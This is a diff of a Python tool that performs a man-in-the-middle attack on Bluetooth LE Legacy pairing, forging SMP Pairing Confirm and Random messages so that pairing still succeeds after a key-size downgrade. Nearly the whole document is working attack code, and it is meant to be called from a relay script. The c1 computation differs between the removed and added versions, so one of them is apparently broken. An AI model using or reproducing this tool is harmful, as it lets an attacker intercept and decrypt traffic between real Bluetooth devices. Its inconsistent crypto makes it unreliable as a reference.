@@ -1,165 +1,199 @@
-# smp_legacy_mitm.py
-# MITM for BLE Legacy SMP (Just Works / TK=0): rewrites Pairing Confirm/Random
-# to match your downgraded Pairing Req/Rsp (key size 1..16).
+# SPDX-License-Identifier: GPL-3.0-or-later
+# smp_confirm_bridge.py — rewrite SMP Confirm/Random so pairing succeeds after key-size downgrade.
 #
-# Works by:
-#  - Recording the downgraded preq/pres each side "saw" (7-byte payloads)
-#  - Generating our own nonce r for each side
-#  - Replacing outgoing Confirm with c1(TK=0, r, p1, p2)
-#  - Replacing outgoing Random with the r we used
+# Requires: PyCryptodome (pip install pycryptodome)
 #
-# Safe no-ops if packet is not SMP or is Secure Connections.
+# Works for LE Legacy, Just Works (TK = 0…0). If you use Passkey/OOB, set TK accordingly.
+
 from dataclasses import dataclass, field
+from typing import Optional, Tuple
 import os
 
-# ---- minimal AES-128 ECB (needs pycryptodome) ----
-from Crypto.Cipher import AES
+try:
+    from Crypto.Cipher import AES
+except ImportError as e:
+    raise SystemExit("PyCryptodome required: pip install pycryptodome") from e
 
-def _xor16(a: bytes, b: bytes) -> bytes:
-    return bytes(x ^ y for x, y in zip(a, b))
+# --- at top of mitble_help.py ---
+DEBUG_MITM = True
 
-def _aes_ecb(k16: bytes, b16: bytes) -> bytes:
-    return AES.new(k16, AES.MODE_ECB).encrypt(b16)
+def _hx(b: bytes) -> str:
+    return ''.join(f'{x:02x}' for x in b)
 
-def c1_confirm(TK16: bytes, r16: bytes, pres7: bytes, preq7: bytes,
-               iat: int, ia6: bytes, rat: int, ra6: bytes) -> bytes:
-    p1 = pres7 + preq7 + bytes([rat]) + bytes([iat])      # 16
-    p2 = b'\x00\x00\x00\x00' + ia6 + ra6                  # 16
-    return _xor16(_aes_ecb(TK16, _xor16(r16, p1)), p2)
+# ---------- Low-level helpers (spec-accurate) ----------
+def _aes_e(key16: bytes, block16: bytes) -> bytes:
+    return AES.new(key16, AES.MODE_ECB).encrypt(block16)
 
-def s1_stk(TK16: bytes, r1_16: bytes, r2_16: bytes) -> bytes:
-    return _aes_ecb(TK16, r1_16[:8] + r2_16[:8])
+def _c1(TK: bytes, r: bytes, preq7: bytes, pres7: bytes,
+        iat: int, rat: int, ia6: bytes, ra6: bytes) -> bytes:
+    """
+    c1(k, r, preq, pres, iat, rat, ia, ra) = e(k, e(k, r XOR p1) XOR p2)
+    preq/pres are the 7-byte SMP command bodies (starting at Code).
+    iat/rat are 0=public,1=random. ia/ra are 6-byte addresses.
+    Construction follows Core v5.x Vol 3, Part H, 2.2.3.  (p1, p2).
+    """
+    assert len(TK) == 16 and len(r) == 16 and len(preq7) == 7 and len(pres7) == 7
+    assert len(ia6) == 6 and len(ra6) == 6
+    iatp = bytes([iat & 1])   # 8-bit iat' with 7 zeros is just the LSB kept; rest zeros
+    ratp = bytes([rat & 1])
+    # p1 = pres || preq || rat' || iat'
+    p1 = pres7 + preq7 + ratp + iatp
+    # p2 = padding(4) || ia || ra
+    p2 = b"\x00\x00\x00\x00" + ia6 + ra6
+    return _aes_e(TK, bytes(x ^ y for x, y in zip(_aes_e(TK, bytes(x ^ y for x, y in zip(r, p1))), p2)))
 
-def mask_key_to_size(key16: bytes, key_size: int) -> bytes:
-    msb = 16 - key_size
-    return (b'\x00' * msb) + key16[msb:]
+def _rand16() -> bytes:
+    return os.urandom(16)
 
-# ---- L2CAP/SMP helpers ----
-SMP_CID = 0x0006
-SMP_PAIRING_REQ  = 0x01
-SMP_PAIRING_RSP  = 0x02
-SMP_PAIRING_CFM  = 0x03
-SMP_PAIRING_RAND = 0x04
-SMP_PUBLIC_KEY   = 0x0C  # Secure Connections indicator
+# ---------- SMP/L2CAP parsing ----------
+_SMP_CID = 0x0006
+_SMP_CONFIRM = 0x03
+_SMP_RANDOM  = 0x04
+_SMP_PAIR_REQ = 0x01
+_SMP_PAIR_RSP = 0x02
 
-def _is_start_of_l2cap(ll_body: bytes) -> bool:
-    return len(ll_body) >= 4 and (ll_body[0] & 0x03) == 0x02 and ll_body[1] >= 4
-
-def _extract_smp(ll_body: bytes):
-    """Return (offset, smp_bytes) or (None, None)."""
-    if not _is_start_of_l2cap(ll_body):
-        return (None, None)
+def _parse_ll_l2cap_smp(ll_body: bytes) -> Tuple[bool, int, bytes, int, bytes, int, bytes]:
+    """
+    Returns: (is_l2cap, l2len, l2hdr, cid, smp, smplen, smp_full)
+      smp is the SMP payload (len==smplen), NOT including L2CAP hdr.
+    On non-L2CAP/SMP, returns (False, 0, b'', 0, b'', 0, b'')
+    """
+    if len(ll_body) < 4:
+        return (False, 0, b'', 0, b'', 0, b'')
+    llid = ll_body[0] & 0x03
     length = ll_body[1]
-    l2cap = ll_body[2:2+length]
-    if len(l2cap) < 7:
-        return (None, None)
-    l2len = l2cap[0] | (l2cap[1] << 8)
-    cid   = l2cap[2] | (l2cap[3] << 8)
-    if cid != SMP_CID or len(l2cap) < 4 + l2len:
-        return (None, None)
-    smp = l2cap[4:4+l2len]
-    return (2 + 4, smp)  # offset to SMP inside ll_body
+    if llid != 0x02 or len(ll_body) < 2 + length or length < 4:
+        return (False, 0, b'', 0, b'', 0, b'')
+    l2 = ll_body[2:2+length]
+    l2len = l2[0] | (l2[1] << 8)
+    cid   = l2[2] | (l2[3] << 8)
+    if cid != _SMP_CID or len(l2) < 4 + l2len or l2len < 1:
+        return (False, 0, b'', 0, b'', 0, b'')
+    smp = l2[4:4+l2len]
+    return (True, l2len, l2[:4], cid, smp, l2len, l2[:4] + smp)
 
-def _patch_smp(ll_body: bytes, smp_off: int, new_smp: bytes) -> bytes:
-    """Replace SMP payload (keeping L2CAP header + LL framing consistent)."""
+def _rebuild_ll_with_smp(ll_body: bytes, new_smp: bytes) -> bytes:
+    """Replace the SMP payload in an LL Data PDU while preserving lengths/headers."""
+    llid = ll_body[0]
     length = ll_body[1]
-    l2cap = ll_body[2:2+length]
-    l2len_old = l2cap[0] | (l2cap[1] << 8)
-    head = ll_body[:2]                  # [LL hdr+len]
-    l2hdr = l2cap[:4]                   # [L2LEN,L2CID]
-    tail = ll_body[2+4+l2len_old:]      # remainder after old SMP
-    new_l2len = len(new_smp)
-    new_l2hdr = bytes([new_l2len & 0xFF, (new_l2len >> 8) & 0xFF]) + l2hdr[2:]
-    new_l2 = new_l2hdr + new_smp
-    new_len = len(new_l2) + 2  # L2 header already counted
-    return bytes([head[0]]) + bytes([new_len]) + new_l2 + tail
+    l2 = ll_body[2:2+length]
+    # rebuild L2CAP (same length)
+    new_l2 = l2[:4] + new_smp
+    return bytes([llid, len(new_l2)]) + new_l2 + ll_body[2+length:]
 
+# ---------- State we keep per receiver's perspective ----------
 @dataclass
-class SideView:
-    """What ONE endpoint 'sees' for p1/p2 and our chosen r."""
-    pres7: bytes = None
-    preq7: bytes = None
+class ConfirmView:
+    # preq/pres as SEEN BY THE RECEIVER (after your downgrade)
+    preq7: Optional[bytes] = None
+    pres7: Optional[bytes] = None
     iat: int = 0
-    ia6: bytes = b""
     rat: int = 0
+    ia6: bytes = b""
     ra6: bytes = b""
-    r16: bytes = None
-    confirm_sent: bool = False
+    # When we forge a confirm, we stash the matching r' to replay as Random.
+    forged_r: Optional[bytes] = None
+
+    def ready(self) -> bool:
+        return self.preq7 is not None and self.pres7 is not None and len(self.ia6) == 6 and len(self.ra6) == 6
 
 @dataclass
-class LegacyMitm:
-    """
-    Tracks both directions of the *same* connection.
-    dir names:
-      - to_periph: packets going from CENTRAL side -> PERIPHERAL side
-      - to_central: packets going from PERIPHERAL side -> CENTRAL side
-    """
-    key_size: int = 4                         # your downgraded size
-    TK: bytes = field(default_factory=lambda: b"\x00"*16)
-    to_periph: SideView = field(default_factory=SideView)  # central's view
-    to_central: SideView = field(default_factory=SideView) # peripheral's view
-    secure_connections_seen: bool = False
+class BridgeState:
+    # What the REAL CENTRAL (C) will compute when checking the PERIPHERAL peer
+    to_central: ConfirmView = field(default_factory=ConfirmView)
+    # What the REAL PERIPHERAL (P) will compute when checking the CENTRAL peer
+    to_periph: ConfirmView  = field(default_factory=ConfirmView)
+    # TK (16 bytes). For Just Works this is 16 zeroes.
+    TK: bytes = b"\x00" * 16
 
-    # --- must be called once per link with addresses/types from the initial CONNECT_IND ---
-    def set_addresses(self, initA: bytes, initA_is_random: bool, advA: bytes, advA_is_random: bool):
-        # For c1, 'ia' is initiator, 'ra' is responder.
-        # When we send to PERIPH (central->periph direction), the side verifying is PERIPH:
-        self.to_periph.iat = 1 if initA_is_random else 0
-        self.to_periph.ia6 = bytes(initA)
-        self.to_periph.rat = 1 if advA_is_random else 0
-        self.to_periph.ra6 = bytes(advA)
-        # When we send to CENTRAL (periph->central), the verifier is CENTRAL (swap roles):
-        self.to_central.iat = self.to_periph.iat
-        self.to_central.ia6 = self.to_periph.ia6
-        self.to_central.rat = self.to_periph.rat
-        self.to_central.ra6 = self.to_periph.ra6
+    def set_addrs_for_central_view(self, ia6: bytes, iat: int, ra6: bytes, rat: int):
+        self.to_central.ia6, self.to_central.iat = ia6, iat & 1
+        self.to_central.ra6, self.to_central.rat = ra6, rat & 1
 
-    # --- call this on every LL body in each direction ---
-    def rewrite_ll_body(self, ll_body: bytes, direction: str):
-        """
-        direction: "to_periph" (central->periph) or "to_central" (periph->central)
-        Returns (possibly_modified_ll_body, changed_bool)
-        """
-        off, smp = _extract_smp(ll_body)
-        if off is None:
-            return (ll_body, False)
+    def set_addrs_for_periph_view(self, ia6: bytes, iat: int, ra6: bytes, rat: int):
+        self.to_periph.ia6, self.to_periph.iat = ia6, iat & 1
+        self.to_periph.ra6, self.to_periph.rat = ra6, rat & 1
 
-        code = smp[0]
-        # bail out if we see SC
-        if code == SMP_PUBLIC_KEY:
-            self.secure_connections_seen = True
-            return (ll_body, False)
+STATE = BridgeState()
 
-        # capture downgraded preq/pres, assuming caller already patched key-size
-        view = self.to_periph if direction == "to_periph" else self.to_central
+# ---------- Public API you call from relay_master.py ----------
 
-        if code in (SMP_PAIRING_REQ, SMP_PAIRING_RSP):
-            if len(smp) >= 8:
-                payload7 = smp[:7]      # io_cap..resp_key_dist (7 bytes)
-                if code == SMP_PAIRING_REQ:
-                    view.preq7 = payload7
-                else:
-                    view.pres7 = payload7
-            return (ll_body, False)
+def note_pairing_pdu_for_receiver(ll_body: bytes, receiver_is_central: bool):
+    ok, l2len, l2hdr, cid, smp, smplen, _ = _parse_ll_l2cap_smp(ll_body)
+    if not ok or smplen < 7:
+        return
+    code = smp[0]
+    if code not in (_SMP_PAIR_REQ, _SMP_PAIR_RSP):
+        return
 
-        # Rewrite Confirm: we generate C' with our own random; remember r for later Random
-        if code == SMP_PAIRING_CFM and view.preq7 and view.pres7:
-            # generate r for this side only once
-            if view.r16 is None:
-                view.r16 = os.urandom(16)
-            C = c1_confirm(self.TK, view.r16, view.pres7, view.preq7, view.iat, view.ia6, view.rat, view.ra6)
-            new_smp = bytes([SMP_PAIRING_CFM]) + C
-            new_ll = _patch_smp(ll_body, off, new_smp)
-            view.confirm_sent = True
-            return (new_ll, True)
+    view = STATE.to_central if receiver_is_central else STATE.to_periph
+    if code == _SMP_PAIR_REQ:
+        view.preq7 = smp[:7]
+        if DEBUG_MITM:
+            print(f"[STORE preq7 -> {'CENTRAL' if receiver_is_central else 'PERIPH '}] preq7={_hx(view.preq7)}")
+            print(f"  addr_ctx: iat={view.iat} ia={_hx(view.ia6)} rat={view.rat} ra={_hx(view.ra6)}")
+    elif code == _SMP_PAIR_RSP:
+        view.pres7 = smp[:7]
+        if DEBUG_MITM:
+            print(f"[STORE pres7 -> {'CENTRAL' if receiver_is_central else 'PERIPH '}] pres7={_hx(view.pres7)}")
+            print(f"  addr_ctx: iat={view.iat} ia={_hx(view.ia6)} rat={view.rat} ra={_hx(view.ra6)}")
 
-        # Rewrite Random: must send the SAME r we used for Confirm to this side
-        if code == SMP_PAIRING_RAND and view.confirm_sent and view.r16 is not None:
-            new_smp = bytes([SMP_PAIRING_RAND]) + view.r16
-            new_ll = _patch_smp(ll_body, off, new_smp)
-            return (new_ll, True)
 
-        return (ll_body, False)
+def rewrite_confirm_random(ll_body: bytes, receiver_is_central: bool):
+    ok, l2len, l2hdr, cid, smp, smplen, _ = _parse_ll_l2cap_smp(ll_body)
+    if not ok or smplen not in (17,):  # 1 + 16
+        return (ll_body, False, "")
+
+    code = smp[0]
+    view = STATE.to_central if receiver_is_central else STATE.to_periph
+    side = "CENTRAL" if receiver_is_central else "PERIPH "
+
+    if code == _SMP_CONFIRM:
+        onwire_c = smp[1:17]
+        if not view.ready():
+            if DEBUG_MITM:
+                print(f"[CONF->{side}] NOT READY | onwire_c={_hx(onwire_c)} "
+                      f"preq7? {view.preq7 is not None} pres7? {view.pres7 is not None} "
+                      f"addr_ctx ia={_hx(view.ia6)} iat={view.iat} ra={_hx(view.ra6)} rat={view.rat}")
+            return (ll_body, False, "NOT_READY")
+
+        # Forge r' and compute confirm' for the receiver’s inputs
+        rprime = _rand16()
+        cprime = _c1(STATE.TK, rprime, view.preq7[0:7], view.pres7[0:7],
+                     view.iat, view.rat, view.ia6, view.ra6)
+
+        if DEBUG_MITM:
+            print(f"[CONF->{side}] onwire_c={_hx(onwire_c)}  TK={_hx(STATE.TK)}")
+            print(f"  using preq7={_hx(view.preq7)} pres7={_hx(view.pres7)} "
+                  f"iat={view.iat} ia={_hx(view.ia6)} rat={view.rat} ra={_hx(view.ra6)}")
+            print(f"  r'={_hx(rprime)}  c1_local={_hx(cprime)}  (will SEND this confirm)")
+
+        view.forged_r = rprime
+        new_smp = bytes([_SMP_CONFIRM]) + cprime
+        return (_rebuild_ll_with_smp(ll_body, new_smp), True, "FORGE_CONFIRM")
+
+    if code == _SMP_RANDOM:
+        onwire_r = smp[1:17]
+        if view.forged_r is None:
+            if DEBUG_MITM:
+                print(f"[RAND->{side}] NO_STORED_R | onwire_r={_hx(onwire_r)}")
+            return (ll_body, False, "NO_STORED_R")
+
+        if DEBUG_MITM:
+            # Recompute c1 with stored inputs to sanity-check
+            c_check = _c1(STATE.TK, view.forged_r, view.preq7[0:7], view.pres7[0:7],
+                          view.iat, view.rat, view.ia6, view.ra6)
+            print(f"[RAND->{side}] onwire_r={_hx(onwire_r)}  stored_r'={_hx(view.forged_r)} "
+                  f"(we will SEND stored_r')")
+            print(f"  Sanity: c1(TK, r', ...)={_hx(c_check)} (should match the confirm we sent earlier)")
+
+        new_smp = bytes([_SMP_RANDOM]) + view.forged_r
+        view.forged_r = None
+        return (_rebuild_ll_with_smp(ll_body, new_smp), True, "FORGE_RANDOM")
+
+    return (ll_body, False, "")
+
+
 
 # ...paste your code exactly as you posted...
 
